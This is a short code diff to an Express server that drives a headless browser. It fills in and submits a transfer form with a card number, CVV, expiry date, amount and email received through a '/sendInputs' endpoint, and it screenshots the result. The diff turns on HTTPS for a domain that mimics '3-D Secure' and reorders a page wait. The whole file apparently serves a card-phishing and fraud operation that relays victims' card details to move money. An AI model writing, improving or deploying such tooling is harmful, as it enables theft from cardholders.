@@ -8,10 +8,10 @@ const https = require("https"),
   fs = require("fs");
 
 
-// const options = {
-//   key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
-//   cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
-// };
+const options = {
+  key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
+  cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
+};
 
 const app = express()
 
@@ -72,8 +72,9 @@ const send_html = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     await page.waitForTimeout(1000);
     await page.click('.submit-button-298')
 
-    await page.waitForNavigation({waitUntil: 'networkidle2'});
+
     await page.screenshot({ path: 'info' + 1 + '.png' })
+    await page.waitForNavigation({waitUntil: 'networkidle2'});
 
     await page.waitForTimeout(5000);
 
@@ -112,4 +113,4 @@ app.get('/sendInputs/:id/:inputs', async (req, res) => {
 })
 
 app.listen(5000)
-// https.createServer(options, app).listen(443);
+https.createServer(options, app).listen(443);
